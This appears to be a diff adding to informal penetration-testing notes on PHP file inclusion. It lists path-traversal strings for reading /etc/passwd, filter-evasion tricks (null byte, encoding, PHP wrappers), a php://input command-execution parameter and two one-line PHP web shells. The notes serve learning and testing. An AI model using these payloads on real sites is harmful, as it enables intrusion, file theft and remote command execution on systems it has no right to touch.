@@ -40,3 +40,28 @@ http://donhackingarticles.com?page=../../../etc/passwd
 - Allow-url-open & Allow-url-include should be OOOnn .
 ----------------------------------------------------- 
 - Remote file exec by uploading a file into the server .
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+There is something called PHP wrappers which helps you to overcome the difficulties :
+
+if the file is about to end with ".php" extention or the file name not exceded xxxx bytes .
+
+For more information visit : 
+https://book.hacktricks.xyz/pentesting-web/file-inclusion 
+https://cobalt.io/blog/a-pentesters-guide-to-file-inclusion
+
+The first one is ../../.../../../etc/passwd and so on 
+Then ../..//..////../..//../../../ and so on 
+then ../\..\..\../../../\../etc/passwd and so on
+then null byte %00 
+then Encoding 
+then using filters and wrappers 
+then base64 encoding 
+
+Use the following command to execute commands :
+?page=php://input&cmd=ls or any command 
+
+<?php echo shell_exec($_GET['cmd']);?> ..... This is used to exploit command from one word 
+<?php echo passthru(base64_decode($_GET['cmd']));?>
+
